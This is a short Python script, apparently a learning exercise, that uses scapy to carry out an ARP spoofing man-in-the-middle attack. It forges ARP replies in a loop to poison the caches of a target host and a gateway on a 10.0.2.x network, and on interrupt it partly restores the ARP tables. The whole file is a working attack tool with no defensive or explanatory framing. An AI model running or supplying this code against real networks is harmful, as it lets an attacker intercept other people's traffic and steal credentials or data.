#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    # make an arp request to get the ip and MAC address
    arp_request = scapy.ARP(pdst=ip)
    # make a broadcast variable to broadcast packets using the MAC address
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    # created this arp_request_broadcast to use the srp method
    arp_request_broadcast = broadcast/arp_request
    # use srp method to send and receive packets
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered[0][1].hwsrc


def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)

    # make a packet using ARP class to find ip and mac on same network. op=2 is making a response
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # we then use scapy.send method to send the response we are trying to achieve
    scapy.send(packet,verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst = destination_ip, hwdst = destination_mac, psrc=source_ip, hwsrc = source_mac)
    scapy.send(packet,verbose = False, count=4)


sent_packets_count =0

try:
    while True:
        spoof('10.0.2.13', '10.0.2.1')
        spoof('10.0.2.1', '10.0.2.13')
        sent_packets_count = sent_packets_count + 2
        print('\rsent two packet: '+ str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print('[+]restoring ARP tables')
    restore('10.0.2.13','10.0.2.1')
